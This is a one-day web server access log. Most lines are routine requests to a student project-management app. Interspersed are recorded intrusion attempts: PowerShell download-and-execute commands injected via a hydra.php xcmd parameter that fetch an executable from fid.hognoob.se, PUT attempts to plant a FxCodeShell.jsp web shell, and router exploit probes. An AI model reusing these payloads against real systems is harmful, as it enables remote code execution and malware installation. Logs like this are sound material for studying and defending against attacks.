106.15.76.85 - - [22/May/2019:00:36:18 +0800] "GET / HTTP/1.0" 200 11398
47.105.136.52 - - [22/May/2019:05:51:41 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe');start%20%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe HTTP/1.1" 404 983
47.105.122.27 - - [22/May/2019:06:54:01 +0800] "GET null null" 400 -
47.105.122.27 - - [22/May/2019:06:54:01 +0800] "GET null null" 400 -
47.105.122.27 - - [22/May/2019:06:54:01 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe');start%20%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe HTTP/1.1" 404 983
47.105.122.27 - - [22/May/2019:07:22:52 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
47.105.122.27 - - [22/May/2019:07:22:52 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
47.105.122.27 - - [22/May/2019:07:22:52 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
47.105.122.27 - - [22/May/2019:07:22:52 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
118.31.244.58 - - [22/May/2019:07:46:16 +0800] "GET / HTTP/1.0" 200 11398
47.97.10.19 - - [22/May/2019:09:49:02 +0800] "GET / HTTP/1.0" 200 11398
47.105.136.52 - - [22/May/2019:09:54:16 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:09:54:16 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:09:54:16 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe');start%20%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe HTTP/1.1" 404 983
80.82.70.187 - - [22/May/2019:12:47:25 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
184.105.139.68 - - [22/May/2019:12:48:55 +0800] "GET / HTTP/1.1" 200 11418
41.38.27.120 - - [22/May/2019:12:50:19 +0800] "POST /tmUnblock.cgi HTTP/1.1" 404 977
109.195.243.100 - - [22/May/2019:13:46:24 +0800] "GET / HTTP/1.1" 200 11418
47.105.136.52 - - [22/May/2019:14:45:52 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
47.105.136.52 - - [22/May/2019:14:45:52 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
47.105.136.52 - - [22/May/2019:14:45:52 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
47.105.136.52 - - [22/May/2019:14:45:52 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
47.105.136.52 - - [22/May/2019:14:59:48 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:14:59:48 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:14:59:48 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe');start%20%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe HTTP/1.1" 404 983
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
219.145.104.203 - - [22/May/2019:15:34:53 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66964
219.145.104.203 - - [22/May/2019:15:34:54 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
219.145.104.203 - - [22/May/2019:15:34:57 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
219.145.104.203 - - [22/May/2019:15:34:57 +0800] "GET /bysj/images/logo4.png HTTP/1.1" 200 8674
219.145.104.203 - - [22/May/2019:15:34:57 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
219.145.104.203 - - [22/May/2019:15:34:57 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "POST /bysj/login HTTP/1.1" 200 3509
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/title.js HTTP/1.1" 200 1998
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/css/Main.css HTTP/1.1" 200 583
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/layout_arrows.png HTTP/1.1" 200 319
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/images/nav1.jpg HTTP/1.1" 200 35839
219.145.104.203 - - [22/May/2019:15:34:58 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
219.145.104.203 - - [22/May/2019:15:35:00 +0800] "GET /bysj/userInfo HTTP/1.1" 200 1718
219.145.104.203 - - [22/May/2019:15:35:00 +0800] "GET /bysj/toGroupInfo HTTP/1.1" 200 1305
219.145.104.203 - - [22/May/2019:15:35:00 +0800] "GET /bysj/js/student/sGroupInfo.js HTTP/1.1" 200 2009
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "POST /bysj/Stu/querySGroupInfo HTTP/1.1" 200 1276
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "POST /bysj/Stu/queryTInfo HTTP/1.1" 200 416
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/toTopic HTTP/1.1" 200 4094
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/js/student/topicSApply.js HTTP/1.1" 200 1556
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/js/student/topic.js HTTP/1.1" 200 5131
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/search.png HTTP/1.1" 200 813
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/edit_add.png HTTP/1.1" 200 1088
219.145.104.203 - - [22/May/2019:15:35:01 +0800] "POST /bysj/Stu/queryDTopic HTTP/1.1" 200 2329
219.145.104.203 - - [22/May/2019:15:35:02 +0800] "GET /bysj/toTopicResult HTTP/1.1" 200 1213
219.145.104.203 - - [22/May/2019:15:35:02 +0800] "GET /bysj/js/student/topicResult.js HTTP/1.1" 200 5159
219.145.104.203 - - [22/May/2019:15:35:02 +0800] "POST /bysj/Stu/queryTopicResult HTTP/1.1" 200 511
219.145.104.203 - - [22/May/2019:15:35:05 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
219.145.104.203 - - [22/May/2019:15:35:05 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
219.145.104.203 - - [22/May/2019:15:35:05 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
219.145.104.203 - - [22/May/2019:15:35:06 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3015
219.145.104.203 - - [22/May/2019:15:35:06 +0800] "GET /bysj/js/student/sUpload.js HTTP/1.1" 200 1206
219.145.104.203 - - [22/May/2019:15:35:06 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
219.145.104.203 - - [22/May/2019:15:35:07 +0800] "GET /bysj/toSG HTTP/1.1" 200 3219
219.145.104.203 - - [22/May/2019:15:35:07 +0800] "GET /bysj/js/student/sG.js HTTP/1.1" 200 2899
219.145.104.203 - - [22/May/2019:15:35:07 +0800] "POST /bysj/Stu/querySG HTTP/1.1" 200 471
219.145.104.203 - - [22/May/2019:15:35:07 +0800] "GET /bysj/toScore HTTP/1.1" 200 1185
219.145.104.203 - - [22/May/2019:15:35:07 +0800] "GET /bysj/js/student/sScore.js HTTP/1.1" 200 1863
219.145.104.203 - - [22/May/2019:15:35:08 +0800] "POST /bysj/Stu/querySScore HTTP/1.1" 200 552
219.145.104.203 - - [22/May/2019:15:35:08 +0800] "GET /bysj/toSpeechGroup HTTP/1.1" 200 1203
219.145.104.203 - - [22/May/2019:15:35:08 +0800] "GET /bysj/js/student/sSpeechGroup.js HTTP/1.1" 200 927
219.145.104.203 - - [22/May/2019:15:35:08 +0800] "POST /bysj/Stu/querySSpeechGroup HTTP/1.1" 200 226
219.145.104.203 - - [22/May/2019:15:35:17 +0800] "GET /bysj HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:35:17 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:35:17 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
219.145.104.203 - - [22/May/2019:15:35:19 +0800] "POST /bysj/login HTTP/1.1" 200 3509
219.145.104.203 - - [22/May/2019:15:35:19 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2602
219.145.104.203 - - [22/May/2019:15:35:28 +0800] "GET /bysj HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:35:28 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:35:28 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
219.145.104.203 - - [22/May/2019:15:35:30 +0800] "POST /bysj/login HTTP/1.1" 200 3515
219.145.104.203 - - [22/May/2019:15:35:30 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 3478
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "GET /bysj/toDocType HTTP/1.1" 200 2960
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "GET /bysj/js/student/docTypeAdd.js HTTP/1.1" 200 1267
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "GET /bysj/js/student/docType.js HTTP/1.1" 200 3387
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "GET /bysj/js/student/docTypeEdit.js HTTP/1.1" 200 1426
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/edit_remove.png HTTP/1.1" 200 625
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/pencil.png HTTP/1.1" 200 713
219.145.104.203 - - [22/May/2019:15:35:32 +0800] "POST /bysj/queryDocType HTTP/1.1" 200 858
219.145.104.203 - - [22/May/2019:15:35:39 +0800] "GET /bysj/toSDoc HTTP/1.1" 200 1210
219.145.104.203 - - [22/May/2019:15:35:39 +0800] "GET /bysj/js/admin/sRead3.js HTTP/1.1" 200 4622
219.145.104.203 - - [22/May/2019:15:35:39 +0800] "POST /bysj/Admin/queryDDoc HTTP/1.1" 200 2821
219.145.104.203 - - [22/May/2019:15:35:40 +0800] "GET /bysj/toDocChk HTTP/1.1" 200 2657
219.145.104.203 - - [22/May/2019:15:35:40 +0800] "GET /bysj/js/admin/dChk.js HTTP/1.1" 200 5432
219.145.104.203 - - [22/May/2019:15:35:40 +0800] "POST /bysj/Admin/dQueryChkDoc HTTP/1.1" 200 433
219.145.104.203 - - [22/May/2019:15:35:41 +0800] "GET /bysj/toTG HTTP/1.1" 200 4003
219.145.104.203 - - [22/May/2019:15:35:41 +0800] "GET /bysj/js/admin/dTG.js HTTP/1.1" 200 3843
219.145.104.203 - - [22/May/2019:15:35:42 +0800] "POST /bysj/Admin/queryDTG HTTP/1.1" 200 1217
219.145.104.203 - - [22/May/2019:15:35:42 +0800] "GET /bysj/toScore HTTP/1.1" 200 5422
219.145.104.203 - - [22/May/2019:15:35:42 +0800] "GET /bysj/js/admin/dScore.js HTTP/1.1" 200 5213
219.145.104.203 - - [22/May/2019:15:35:42 +0800] "GET /bysj/js/admin/dScoreAdd.js HTTP/1.1" 200 1259
219.145.104.203 - - [22/May/2019:15:35:42 +0800] "GET /bysj/js/admin/dScoreEdit.js HTTP/1.1" 200 1429
219.145.104.203 - - [22/May/2019:15:35:43 +0800] "POST /bysj/Admin/queryDScore HTTP/1.1" 200 2077
219.145.104.203 - - [22/May/2019:15:35:44 +0800] "GET /bysj/toSSpeechA HTTP/1.1" 200 1211
219.145.104.203 - - [22/May/2019:15:35:44 +0800] "GET /bysj/js/admin/dSG.js HTTP/1.1" 200 1791
219.145.104.203 - - [22/May/2019:15:35:44 +0800] "POST /bysj/Admin/queryDSG HTTP/1.1" 200 1684
219.145.104.203 - - [22/May/2019:15:35:45 +0800] "GET /bysj/toSpeechGroup HTTP/1.1" 200 3256
219.145.104.203 - - [22/May/2019:15:35:45 +0800] "GET /bysj/js/admin/dSpeechGroup.js HTTP/1.1" 200 4090
219.145.104.203 - - [22/May/2019:15:35:45 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/datebox_arrow.png HTTP/1.1" 200 626
219.145.104.203 - - [22/May/2019:15:35:45 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/spinner_arrows.png HTTP/1.1" 200 149
219.145.104.203 - - [22/May/2019:15:35:45 +0800] "POST /bysj/Admin/queryDSpeechGroup HTTP/1.1" 200 842
219.145.104.203 - - [22/May/2019:15:35:46 +0800] "GET /bysj/toUserList HTTP/1.1" 200 6652
219.145.104.203 - - [22/May/2019:15:35:46 +0800] "GET /bysj/js/teacher/userList.js HTTP/1.1" 200 7229
219.145.104.203 - - [22/May/2019:15:35:46 +0800] "GET /bysj/js/teacher/userEdit.js HTTP/1.1" 200 1426
219.145.104.203 - - [22/May/2019:15:35:46 +0800] "GET /bysj/js/teacher/userAdd.js HTTP/1.1" 200 1267
219.145.104.203 - - [22/May/2019:15:35:46 +0800] "POST /bysj/Admin/queryUserList HTTP/1.1" 200 3622
219.145.104.203 - - [22/May/2019:15:35:47 +0800] "GET /bysj/toResetPassword HTTP/1.1" 200 1992
219.145.104.203 - - [22/May/2019:15:35:47 +0800] "GET /bysj/js/resetPassword.js HTTP/1.1" 200 206
219.145.104.203 - - [22/May/2019:15:35:55 +0800] "GET /bysj HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:35:55 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [22/May/2019:15:35:55 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
219.145.104.203 - - [22/May/2019:15:35:57 +0800] "POST /bysj/login HTTP/1.1" 200 3512
219.145.104.203 - - [22/May/2019:15:35:57 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2175
89.248.169.12 - - [22/May/2019:17:08:37 +0800] "GET / HTTP/1.1" 200 11418
47.105.143.33 - - [22/May/2019:19:45:30 +0800] "GET / HTTP/1.1" 200 11418
47.105.136.52 - - [22/May/2019:20:10:53 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:20:10:53 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:20:10:53 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe');start%20%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe HTTP/1.1" 404 983
47.105.122.27 - - [22/May/2019:20:22:58 +0800] "GET null null" 400 -
47.105.122.27 - - [22/May/2019:20:22:58 +0800] "GET null null" 400 -
47.105.122.27 - - [22/May/2019:20:22:58 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe');start%20%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe HTTP/1.1" 404 983
47.105.136.52 - - [22/May/2019:20:56:16 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:20:56:16 +0800] "GET null null" 400 -
47.105.136.52 - - [22/May/2019:20:56:16 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe');start%20%SystemRoot%/Temp/yrcrwklgwefzgoq3815.exe HTTP/1.1" 404 983
89.215.233.24 - - [22/May/2019:21:30:20 +0800] "GET / HTTP/1.0" 200 11398
47.105.122.27 - - [22/May/2019:21:53:21 +0800] "GET null null" 400 -
47.105.122.27 - - [22/May/2019:21:53:21 +0800] "GET null null" 400 -
47.105.122.27 - - [22/May/2019:21:53:21 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe');start%20%SystemRoot%/Temp/ztbnsrpnihmejbz8495.exe HTTP/1.1" 404 983
80.82.70.187 - - [22/May/2019:22:53:35 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
37.32.116.229 - - [22/May/2019:23:43:50 +0800] "GET / HTTP/1.1" 200 11418
